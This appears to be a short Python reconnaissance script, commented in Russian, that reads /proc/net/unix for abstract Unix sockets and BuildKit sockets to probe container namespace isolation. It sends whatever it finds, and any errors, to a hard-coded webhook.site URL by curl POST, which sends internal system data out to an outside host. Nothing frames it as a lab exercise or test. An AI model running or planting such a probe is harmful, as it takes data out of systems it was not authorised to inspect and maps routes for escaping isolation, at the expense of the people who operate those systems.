import subprocess

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"

def scan_abstract_sockets():
    # Читаем абстрактные сокеты (начинаются с @ в выводе netstat)
    # Мы лезем напрямую в /proc/net/unix, чтобы увидеть "невидимое"
    try:
        with open("/proc/net/unix", "r") as f:
            lines = f.readlines()
            
        abstract = [l.strip() for l in lines if "@" in l or "buildkit" in l.lower()]
        
        if not abstract:
            report = "[*] No abstract sockets found. Namespace isolation is solid."
        else:
            report = "[!!!] FOUND ABSTRACT SOCKETS:\\n" + "\\n".join(abstract)
            
        subprocess.run(['curl', '-s', '-X', 'POST', '-d', report, WEBHOOK_URL])
    except Exception as e:
        subprocess.run(['curl', '-s', '-X', 'POST', '-d', f"Scan error: {e}", WEBHOOK_URL])

if __name__ == "__main__":
    scan_abstract_sockets()
